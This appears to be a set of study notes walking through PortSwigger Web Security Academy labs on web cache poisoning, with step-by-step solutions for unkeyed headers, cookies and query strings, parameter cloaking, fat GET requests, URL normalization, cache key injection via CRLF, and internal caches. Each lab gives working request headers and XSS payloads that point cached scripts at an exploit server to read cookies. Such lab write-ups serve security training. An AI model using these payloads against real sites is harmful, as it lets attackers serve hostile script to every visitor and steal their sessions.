# Web Cache Poisoning
Web cache poisoning involves two phases. First, the attacker must work out how to elicit a response from the back-end server that inadvertently contains some kind of dangerous payload. Once successful, they need to make sure that their response is cached and subsequently served to the intended victims.

## Cache key flaws
- **Unkeyed port**
- **Unkeyed query string:** the following entries might all be cached separately but treated as equivalent to `GET /` on the back-end:
  - Apache: `GET //`
  - Nginx: `GET /%2F`
  - PHP: `GET /index.php/xyz`
  - .NET: `GET /(A(xyz))/`
- **Parameter cloaking:** e.g. this request `GET /?keyed_param=abc&excluded_param=123;keyed_param=bad-stuff-here` many caches will only interpret this as two parameters, delimited by the ampersand: `keyed_param=abc` and `excluded_param=123;keyed_param=bad-stuff-here`. The cache key only contains: `keyed_param=abc`. But at the backend server, Ruby on Rails sees the semicolon and splits the query string into three separate parameters: `keyed_param=abc`, `excluded_param=123` and `keyed_param=bad-stuff-here`. Successfully poisoned the `keyed_param=bad-stuff-here`.

## Constructing a web cache poisoning attack
- **Identify and evaluate unkeyed inputs (use Param Miner's Guess Header):** Web caches ignore unkeyed inputs when deciding whether to serve a cached response to the user. This behavior means that you can use them to inject your payload and elicit a "poisoned" response which, if cached, will be served to all users whose requests have the matching cache key. 
- **Elicit a harmful response**
- **Get the response cached**

### LAB: Web cache poisoning with an unkeyed header
Notice the header `X-Forwarded-Host` is unkeyed and the value is reflected inside the `src` attribute:

    <script type="text/javascript" src="//0a64005404db30c780247b97002100ef.web-security-academy.net/resources/js/tracking.js">

Now visit the exploit server and add this script:

    alert(document.cookie)

Try sending a `GET / HTTP/1.1` request with this header:

    X-Forwarded-Host: exploit-0aaf007c04bc306e80667a2b010d00be.exploit-server.net/exploit

Notice the response is now appending the `/resources/js/tracking.js` to our URL which is not where our script is. To correctly point it to our script's location, use this:

    X-Forwarded-Host: exploit-0aaf007c04bc306e80667a2b010d00be.exploit-server.net/exploit">

Send the request to make the cache server store it. When the victim visits `/`, he will be served with the response calling to our script.

### LAB: Web cache poisoning with an unkeyed cookie
Send a `GET / HTTP/2` request and notice the response is setting a header with `Set-Cookie: fehost=prod-cache-01;` and the value is reflected inside:

    <script>
        data = {"host":"0a35009a0360ce0880088faf00fa0001.web-security-academy.net","path":"/","frontend":"prod-cache-01"}
    </script>

This indicates that we can manipulate the cache via the `Cookie` header. Now send the `GET / HTTP/2` request with this header:

    Cookie: "};alert(1)//

This will successfully breaks out of the `data` variable and call the `alert(1)` function in the response:

    <script>
        data = {"host":"0a35009a0360ce0880088faf00fa0001.web-security-academy.net","path":"/","frontend":""};alert(1)//"}
    </script>

Send the request to make the cache server store it. When the victim visits `/`, he will be served with the response with our script injected.

### LAB: Web cache poisoning with multiple headers
Notice when making the request `GET / HTTP/2`, the browser also makes a request to `/resources/js/tracking.js`. Examine this request, when we add a `X-Forwarded-Scheme` header with a value of anything other `https`, the server responds with a `HTTP/2 302 Found` and this header:

    Location: https://0a6a007f04f8d5ea819d34fa00070065.web-security-academy.net/resources/js/tracking.js

Try adding this header:

    X-Forwarded-Host: exploit-0ae200d70401d5b48132337a0177006e.exploit-server.net/exploit

Notice the `Location` header has changed to this value and append it with `resources/js/tracking.js`:

    Location: https://exploit-0ae200d70401d5b48132337a0177006e.exploit-server.net/exploit/resources/js/tracking.js

To effectively change the location of the page to where our script resides, just add `#` to ignore the appended part. Add the `alert(document.cookie)` script to the exploit server and make this request:

    GET /resources/js/tracking.js HTTP/2
    Host: 0a6a007f04f8d5ea819d34fa00070065.web-security-academy.net
    X-Forwarded-Scheme: http
    X-Forwarded-Host: exploit-0ae200d70401d5b48132337a0177006e.exploit-server.net/exploit#

Now the cache server stores the response with the `Location` header set to our exploit server. Whenever the victim visits `/` he will be redirected to our exploit server.

### LAB: Targeted web cache poisoning using an unknown header
Notice the `Vary: User-Agent` header, this helps us identify that the `User-Agent` header is a cache key.
First, to deliver the exploit to the victim, we need to identify the victim's `User-Agent`. Post a comment with this body:

    <img src="https://exploit-0aa80009033bcb19ded7c4c001450012.exploit-server.net/exploit">

Wait for the victim to see this comment, visit the Access log page of the exploit server and observe the victim's `User-Agent` is `Chrome/231561`.
Next, use `Param Miner` with `Guess Header` and found out the unknown header `X-Host`. It's value is then reflected in the:

    <script type="text/javascript" src="//0a2e00a10315cb43defcc59e0044008b.h1-web-security-academy.net/resources/js/tracking.js"></script>

To make it point to our server, send a request with this header:

    X-Host: exploit-0aa80009033bcb19ded7c4c001450012.exploit-server.net/exploit#

The response's script now successfully point to our exploit server:

    <script type="text/javascript" src="//exploit-0aa80009033bcb19ded7c4c001450012.exploit-server.net/exploit#/resources/js/tracking.js"></script>

Resend that request with the `User-Agent` set to the victim's until the response is cached:

    User-Agent: Chrome/231561

Now when the victim visits the home page, he is served with a script which `src` is our exploit server.

### LAB: Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria
Crawl through the source code and found `/resources/js/geolocate.js`:

    function initGeoLocate(jsonUrl)
    {
        fetch(jsonUrl)
            .then(r => r.json())
            .then(j => {
                let geoLocateContent = document.getElementById('shipping-info');

                let img = document.createElement("img");
                img.setAttribute("src", "/resources/images/localShipping.svg");
                geoLocateContent.appendChild(img)

                let div = document.createElement("div");
                div.innerHTML = 'Free shipping to ' + j.country;
                geoLocateContent.appendChild(div)
            });
    }

The web page is taking the JSON object in this script and pass it to to `initGeoLocate`:

    <script>
        data = {"host":"0a5f00ab03e59cb38472281600280027.web-security-academy.net","path":"/"}
    </script>

Notice that, if we can manipulate the `data.host` we can successfully inject to the DOM usign this JSON object: 

    {
        "country": "<img src=1 onerror=alert(document.cookie)>"
    }

At the exploit server, paste that object to the body and change the headers to allow JSON and CORS:

    HTTP/1.1 200 OK
    Content-Type: application/json; charset=utf-8
    Access-Control-Allow-Origin: *

Now use `Param Miner` with `Guess Header`, we found that `X-Forwarded-Host` value is reflected into `data.host`. Send a `GET / HTTP/2` with this header to successfully manipulate the `data.host` value:

    X-Forwarded-Host: exploit-0a9f000903fd9ce5846a272b015b001e.exploit-server.net/exploit#

Resend this request, so that the malicious response is cached. Now when the victim visits the home page, he is served with this malicious response.

### LAB: Combining web cache poisoning vulnerabilities
Just like the above lab, this lab also support `X-Forwarded-Host` header and imports JSON from its value.
Look at this function:

    function initTranslations(jsonUrl)
    {
        const lang = document.cookie.split(';')
            .map(c => c.trim().split('='))
            .filter(p => p[0] === 'lang')
            .map(p => p[1])
            .find(() => true);

        const translate = (dict, el) => {
            for (const k in dict) {
                if (el.innerHTML === k) {
                    el.innerHTML = dict[k];
                } else {
                    el.childNodes.forEach(el_ => translate(dict, el_));
                }
            }
        }

        fetch(jsonUrl)
            .then(r => r.json())
            .then(j => {
                const select = document.getElementById('lang-select');
                if (select) {
                    for (const code in j) {
                        const name = j[code].name;
                        const el = document.createElement("option");
                        el.setAttribute("value", code);
                        el.innerText = name;
                        select.appendChild(el);
                        if (code === lang) {
                            select.selectedIndex = select.childElementCount - 1;
                        }
                    }
                }

                lang in j && lang.toLowerCase() !== 'en' && j[lang].translations && translate(j[lang].translations, document.getElementsByClassName('maincontainer')[0]);
            });
    }
This function has a dangerous sink `el.innerHTML = dict[k]`, which we can inject our code inside the DOM when the language is other than English. To do so, use this JSON at the exploit server:

    {
        "en-gb": {
            "translations": {
            "High-End Gift Wrapping": "<img src=1 onerror=alert(1)>"
            }
        }
    }

Revisit the page, we notice that the attack was successful. But since the victim is using English, we need somehow to force them into using `en-gb`. Notice another header found by `Param Miner`, which is `X-Original-URL`. This header lets us specify another URL other than the one specified in the `<request-target>` and redirect the user to. For example, consider this request:

    GET / HTTP/2
    X-Original-URL: /login

When the user visits the home page (`/`), instead of getting to the homepage, he is redirected to the login page.
So in this lab, to change the user's language to `en-gb`, we can use this header:

    X-Original-URL: /setlang/en-gb?

But notice, this won't be cached by the cache server, so when the victim visits the home page, there language is not changed. To make it happen modify it to:

    X-Original-URL: /setlang/en-gb//

This request will now be cached, and the browser will redirect the user to `/?localized=1`. We have to also cache this response. To do so resend these 2 request to make the cache server store it:

    GET / HTTP/2
    X-Original-Url: /setlang/en-gb//

    GET /?localized=1 HTTP/2
    Cookie: session=kR2hypLwTseLX3PS2tgOzh4eRvJky3uP; lang=en-gb
    X-Forwarded-Host: exploit-0afc00a7040dbbe283d82cac014d003e.exploit-server.net/exploit#

### LAB: Web cache poisoning via an unkeyed query string
Notice the response is cached based on the `Origin` header and the path in the request target. Try send this request:
    
    GET /?'/><script>alert(1)</script> HTTP/2
    Origin: example.com

Notice a `X-Cache: miss` header and the query parameter is successfully reflected inside the response. Resend this so that the cache server stores the response. Now remove the query parameter and the `Origin` header, resend the request until a `X-Cache: miss` header. Notice the malicious response is now showing, resend one more time to make the server cache this response. Now when the victim make a `GET / HTTP/2` request, he is served with this malicious response.

### LAB: Web cache poisoning via an unkeyed query parameter
Notice the response is cached base the query parameter. Send this request to inject our script:

    GET /?a='/><script>alert(1)</script>

Resend it to make the cache server store it. Now send this request:

    GET /?utm_content=abcxyz

Notice a cache hit but not the our malicious response. This indicates that the server is ignoring pthe `utm_content` parameter. Resend this request until we get a `X-Cache: miss`. This time, the we got served with the malicious response. Resend this again, to get this response cached. Now when the victim visits the home page, he is served with this malicious response.

### LAB: Parameter cloaking
Notice when the home page loads, it also make this request: 

    GET /js/geolocate.js?callback=setCountryCookie

Try change the request to:

    GET /js/geolocate.js?callback=setCountryCookie;callback=alert(1)//

Notice the `alert(1)` function is called instead of the `setCountryCookie`. Now we need to make the cache server cache this response for the `GET /js/geolocate.js?callback=setCountryCookie` request. Notice that the `utm_content` parameter is excluded from the cache key. Make this request:

    GET /js/geolocate.js?callback=setCountryCookie&utm_content=abc;callback=alert(1)//

The cache server will ignores anything after `utm_content`, but the backend server still recognize the last `callback` parameter and overwrites it to call the alert function. Resend this request to make the cache server store this malicious response. Now every time the victim visits the home page, the browser will look for `/js/geolocate.js?callback=setCountryCookie` where our malicious response will be used by the cache server and send back to the victim.

### LAB: Web cache poisoning via a fat GET request
Same as above lab but now the request to `/js/geolocate.js?callback=setCountryCookie` accepts a body. Use this body:

    callback=alert(1)

Notice the `alert(1)` function is called instead. Resend this request until a `X-Cache: miss` header appears. Resend it one more time to make the cache server store our malicious response and serve it to the victim whenever he visits the home page.

### LAB: URL normalization
Try make this request:

    GET /post/commentabcxyz HTTP/2

Notice the response is reflecting our request target:

    <p>Not Found: /post/commentabcxyz</p>

Now send this request to inject our script:

    GET /post/comment<script>alert(1)</script> HTTP/2

Resend it to make cache server store it and submit this URL to the victim:

    https://0ad500a80402b786813207a2002400e2.web-security-academy.net/post/comment<script>alert(1)</script>

Even with the URL encoding, the normalization makes it appears to be the same cache key and the victim will be served with our malicious response.

### LAB: Cache key injection
- The `/login` page **redirects** users based on the `lang` parameter.
- The regex used to filter query parameters **ignores `utm_content`**, allowing an attacker to **append unkeyed parameters** after `lang`:
  ```
  /login?lang=en?utm_content=anything
  ```
  - This means the **cache key does not include everything after the second `?`**, allowing **injection of additional parameters**.
- The `/login/` page imports a localization script:
  ```
  <script src="/js/localize.js?lang=en"></script>
  ```
- However, it **does not URL-encode** the `lang` parameter.
- This means the script URL can be **polluted** with additional parameters via:
  ```
  /js/localize.js?lang=en?utm_content=anything
  ```
- The browser will interpret `?utm_content=anything` as **part of the `lang` value**, causing it to be included in the request **without proper encoding**.
- The `/js/localize.js` endpoint has an issue where, if `cors=1`, it improperly **reflects the `Origin` header** into the response headers **without validation**.
- This allows an attacker to inject headers by **URL-encoding CRLF characters (`%0d%0a`)**, which represents **newline characters**:
  ```
  Origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$
  ```
  - This injects a **fake `Content-Length` header**, followed by **JavaScript payload** (`alert(1)`):
  ```
  Origin: x
  Content-Length: 8

  alert(1)
  ```

---

**Step 1: Poison the Cache for `/js/localize.js`**
- Send the following request:
  ```
  GET /js/localize.js?lang=en?utm_content=z&cors=1&x=1 HTTP/2
  Origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$
  ```
  - This does **two things**:
    1. **Injects the malicious header** (`Content-Length: 8`) into the cached response.
    2. **Caches the poisoned version** of `/js/localize.js` for the cache key: `/js/localize.js?lang=en?cors=1&x=1$$origin=x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$`

---

**Step 2: Poison the Login Page Redirect**
- Next, send:
  ```
  GET /login?lang=en?utm_content=x%26cors=1%26x=1$$origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23 HTTP/2
  ```
  - This **poisons the cache for the login page**, so that:
    1. The **redirected URL** includes the **polluted `lang` parameter** and successfully escape `cors=0` parameter by using `#` (`%23`)
    ```                  
    <script src='/js/localize.js?lang=en?utm_content=x&amp;cors=1&amp;x=1$$origin=x%0d%0aContent-Length: 8%0d%0a%0d%0aalert(1)$$#&cors=0'></script>
    ```
    2. The victim will load the poisoned `/js/localize.js` script.

---

**Step 3: Trigger Execution**
- When a victim visits `/login?lang=en`, they are redirected to the **cached poisoned version of the login page**.
- The login page **loads the cached, poisoned `/js/localize.js`**.
- The script executes **`alert(1)`**, solving the lab.

### LAB: Internal cache poisoning
Notice the `X-Forwarded-Host` header is supported. Add a cache buster to ensure we get fresh responses and can interact directly with the internal cache. Send this request: 

    GET / HTTP/2
    X-Forwarded-Host: exploit-0a2e006104fb490f8211a5c9018a00cc.exploit-server.net/exploit#

Notice the canonical URL and `analytics.js` script update immediately in the response. But the `geolocate.js` script takes several attempts before updating. This indicates that the internal cache stores page fragments separately, and `geolocate.js` is cached differently.
Once `geolocate.js` is cached with the attacker's domain, removing `X-Forwarded-Host` from the request still reflects the poisoned URL for `geolocate.j`s, but not for other URLs. This proves that `X-Forwarded-Host` is unkeyed by the internal cache, meaning we can inject a malicious script reference into the internally cached fragment.
On the exploit server, add this to the body:

    alert(document.cookie);

Resend the request: 

    GET / HTTP/2
    X-Forwarded-Host: exploit-0a2e006104fb490f8211a5c9018a00cc.exploit-server.net/exploit#

Keep sending this until all three dynamic URLs in the response (canonical URL, analytics.js, and geolocate.js) point to the exploit server. When a victim visits the home page, their browser loads the cached `geolocate.js` script from the attacker’s server.

